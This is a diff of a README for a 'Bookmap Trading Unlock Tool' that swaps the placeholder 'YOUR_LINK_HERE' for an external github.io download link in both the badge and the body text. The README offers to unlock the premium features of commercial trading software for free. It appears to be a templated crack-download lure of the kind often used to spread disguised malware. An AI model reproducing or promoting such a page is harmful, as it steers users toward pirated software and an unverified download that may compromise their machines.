@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ Bookmap Trading Unlock Tool</h1>
 
 <p align="center">
-  <a href="YOUR_LINK_HERE" target="_blank">
+  <a href="https://bookmap-trading-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Bookmap%20Trading%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download Bookmap Trading Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -95,7 +95,7 @@ Report issues or contribute via GitHub Issues or Pull Requests.
 ## ⭐️ Unlock Bookmap Trading – Advanced Order Flow Platform
 
 Unlock premium features of **Bookmap Trading**, including **heatmaps, market depth visualization, liquidity tracking, advanced indicators, and broker integration**.  
-[Download the Unlock Tool](YOUR_LINK_HERE) and trade with a new level of precision.  
+[Download the Unlock Tool](https://bookmap-trading-download.github.io/.github/) and trade with a new level of precision.  
 
 ---
 
